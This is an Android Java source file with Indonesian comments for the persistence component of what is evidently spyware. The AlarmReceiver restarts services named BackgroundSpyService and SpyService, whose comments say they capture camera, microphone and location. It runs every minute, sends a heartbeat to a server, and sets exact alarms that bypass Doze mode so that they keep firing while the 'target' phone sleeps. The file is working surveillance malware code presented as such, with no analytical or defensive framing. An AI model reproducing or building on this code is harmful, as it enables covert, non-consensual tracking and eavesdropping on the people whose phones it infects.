package com.nullx.pp;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.SystemClock;
import android.util.Log;

// Pastikan semua service yang mau dijaga sudah di-import
import com.nullx.pp.BackgroundSpyService;
import com.nullx.pp.SpyService;
import com.nullx.pp.NetworkUtils;

/**
 * AlarmReceiver: Jantung persistensi yang menjaga layanan tetap hidup
 * dan mengirim data heartbeat ke server secara berkala.
 */
public class AlarmReceiver extends BroadcastReceiver {
    private static final String TAG = "CRPT.AlarmReceiver";
    private static final String ACTION_TRIGGER = "com.nullx.pp.ALARM_TRIGGER";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "Heartbeat alarm triggered. Checking services...");

        // 1. Membangkitkan kembali semua service utama
        startCoreServices(context);

        // 2. Mengirim heartbeat ke server
        try {
            NetworkUtils.sendHeartbeat(context);
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat failed: " + e.getMessage());
        }

        // 3. Penjadwalan ulang alarm (Self-Healing)
        // Ini kunci agar alarm terus berjalan setiap menit tanpa henti
        reScheduleAlarm(context);
    }

    private void startCoreServices(Context context) {
        try {
            // Restart BackgroundSpyService
            Intent bgIntent = new Intent(context, BackgroundSpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(bgIntent);
            } else {
                context.startService(bgIntent);
            }

            // Restart SpyService (Kamera/Mic/Lokasi)
            Intent spyIntent = new Intent(context, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(spyIntent);
            } else {
                context.startService(spyIntent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error restarting services: " + e.getMessage());
        }
    }

    private void reScheduleAlarm(Context context) {
        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AlarmReceiver.class);
        intent.setAction(ACTION_TRIGGER);

        PendingIntent pendingIntent = PendingIntent.getBroadcast(
                context, 
                0, 
                intent, 
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
        );

        long triggerTime = SystemClock.elapsedRealtime() + 60000; // Eksekusi lagi dalam 1 menit

        if (alarmManager != null) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                // Tembus Doze Mode agar alarm tetap bunyi saat HP target tidur
                alarmManager.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent);
            } else {
                alarmManager.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, triggerTime, pendingIntent);
            }
        }
    }
}